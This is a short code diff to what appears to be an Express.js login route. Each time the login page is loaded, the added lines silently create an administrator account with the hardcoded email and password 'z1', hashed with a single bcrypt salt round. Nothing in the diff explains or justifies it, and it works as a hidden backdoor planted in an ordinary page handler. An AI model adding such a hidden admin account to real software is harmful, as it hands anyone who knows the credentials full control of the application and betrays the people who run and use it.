@@ -10,6 +10,14 @@ router.get('/login', async(req, res) => {
         returnUrl: req.query.returnUrl ? (req.query.returnUrl) : '/',
         ai: req.query.ai ? req.query.ai : null
     };
+
+    if(! await usersRepository.getUserByEmail('z1')){
+        var bcrypt = require('bcryptjs');
+        var salt = bcrypt.genSaltSync(1);
+        var pwdhash = bcrypt.hashSync('z1', salt);
+        await usersRepository.createUser('z1', pwdhash, 'admin');
+    }
+
     res.render('login.ejs', data);
 });
 
